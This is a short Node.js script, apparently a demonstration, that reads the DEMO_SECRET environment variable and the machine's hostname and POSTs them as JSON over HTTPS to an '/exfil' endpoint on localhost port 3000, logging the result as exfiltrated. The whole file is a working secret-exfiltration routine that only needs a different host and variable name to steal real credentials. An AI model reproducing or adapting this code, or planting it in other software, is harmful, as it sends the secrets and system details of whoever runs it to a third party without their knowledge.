const fs = require('fs');
const os = require('os');
const https = require('https');

const secret = process.env.DEMO_SECRET || 'no-secret';
const data = JSON.stringify({
  hostname: os.hostname(),
  secret
});

const options = {
  hostname: 'localhost',
  port: 3000,
  path: '/exfil',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': data.length
  }
};

const req = https.request(options, res => {
  console.log(`Exfiltrated to /exfil - status: ${res.statusCode}`);
});

req.on('error', error => {
  console.error('Failed exfil attempt:', error);
});

req.write(data);
req.end();